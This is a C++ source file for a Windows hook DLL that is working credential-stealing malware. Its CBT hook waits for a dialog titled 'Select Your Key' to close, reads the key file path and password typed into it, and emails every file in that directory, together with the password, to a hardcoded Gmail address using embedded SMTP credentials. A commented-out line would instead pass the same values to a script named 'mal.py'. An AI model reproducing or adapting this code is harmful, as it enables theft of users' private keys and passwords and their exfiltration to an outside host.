
// HookDLL.cpp
#include "HookDLL.h"
#include <windows.h>
#include <fstream>
#include <iostream>
#include <filesystem>
#include <string>
#include <curl/curl.h>

HINSTANCE hInstance;
HHOOK hCbtHook = NULL;
WCHAR szPath[MAX_PATH];
WCHAR szPass[MAX_PATH];


namespace fs = std::filesystem;

static const std::string from_email = "itsrealsoul5@gmail.com";
static const std::string to_email = "itsrealsoul5@gmail.com";
static const std::string cc_email = "cc_email@example.com";
static const std::string smtp_url = "smtps://smtp.gmail.com:465";
static const std::string username = "itsrealsoul5@gmail.com";
static const std::string password = "dibl reij iuzp kohh";

static size_t payload_source(void* ptr, size_t size, size_t nmemb, void* userp) {
    std::string* email_body = static_cast<std::string*>(userp);
    if (email_body->empty()) return 0;

    size_t len = email_body->length();
    memcpy(ptr, email_body->c_str(), len);
    email_body->clear(); // Ensure we only read it once
    return len;
}

void send_email_with_attachments_from_directory(const std::string& directory_path, const std::string& email_body_text) {
    CURL* curl;
    CURLcode res = CURLE_OK;
    struct curl_slist* recipients = NULL;
    std::string email_body = "Subject: SMTP Email with Attachments\r\n\r\n" + email_body_text;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, smtp_url.c_str());
        curl_easy_setopt(curl, CURLOPT_USERNAME, username.c_str());
        curl_easy_setopt(curl, CURLOPT_PASSWORD, password.c_str());
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, from_email.c_str());

        recipients = curl_slist_append(recipients, to_email.c_str());
        recipients = curl_slist_append(recipients, cc_email.c_str());
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

        curl_easy_setopt(curl, CURLOPT_READFUNCTION, payload_source);
        curl_easy_setopt(curl, CURLOPT_READDATA, &email_body);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
        curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);

        // Create MIME for attachments
        curl_mime* mime;
        curl_mimepart* part;
        mime = curl_mime_init(curl);

        // Add all files in the directory as attachments
        for (const auto& entry : fs::directory_iterator(directory_path)) {
            if (entry.is_regular_file()) {
                part = curl_mime_addpart(mime);
                curl_mime_name(part, "attachment");
                curl_mime_filedata(part, entry.path().string().c_str());
            }
        }

        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

        res = curl_easy_perform(curl);

        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
        }

        curl_slist_free_all(recipients);
        curl_easy_cleanup(curl);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        hInstance = hModule;
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

std::string ws2s(const std::wstring& wstr) {
    int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    if (bufferSize == 0) {
        return "";
    }
    std::string str(bufferSize - 1, 0); // Null terminator 제외
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], bufferSize, NULL, NULL);
    return str;
}

// Function to handle CBT hook events
LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HCBT_DESTROYWND) {
        HWND hwnd = (HWND)wParam;
        WCHAR windowText[256];
        GetWindowTextW(hwnd, windowText, sizeof(windowText) / sizeof(WCHAR));
        // Convert wide string to UTF-8 string for logging
        std::string textString = ws2s(windowText);

        // Compare windowText to "Select Your Key"
        if (wcscmp(windowText, L"Select Your Key") == 0) {
            HWND hTextBox = GetDlgItem(hwnd, 1001);
            GetWindowText(hTextBox, szPath, MAX_PATH);
            int len = GetWindowTextLength(hTextBox);
            printf("textlen : %d ", len);
            wprintf(L"szPath : %s ", szPath);

            int bufferSize = WideCharToMultiByte(CP_UTF8, 0, szPath, -1, NULL, 0, NULL, NULL);
            char* szText = new char[bufferSize];
            WideCharToMultiByte(CP_UTF8, 0, szPath, -1, szText, bufferSize, NULL, NULL);

            HWND hPassIdBox = GetDlgItem(hwnd, 1002);
            GetWindowText(hPassIdBox, szPass, MAX_PATH);
            wprintf(L"Passlen : %s ", szPass);
            int passbufferSize = WideCharToMultiByte(CP_UTF8, 0, szPass, -1, NULL, 0, NULL, NULL);
            char* szPassText = new char[passbufferSize];
            WideCharToMultiByte(CP_UTF8, 0, szPass, -1, szPassText, passbufferSize, NULL, NULL);

            //std::cout << "hook path: " << hookPath << std::endl;
            /*
            char cmd[1024];
            memset(cmd, 0, sizeof(cmd));
            snprintf(cmd, sizeof(cmd), "python %s\\mal.py \"%s\" \"%s\"", hookPath, szText, szPassText);
            printf("cmd : %s ", cmd);
            system(cmd);
            */
            send_email_with_attachments_from_directory(szText, szPassText);


            delete[] szPassText;
            delete[] szText;
        }
    }
    return CallNextHookEx(hCbtHook, nCode, wParam, lParam);
}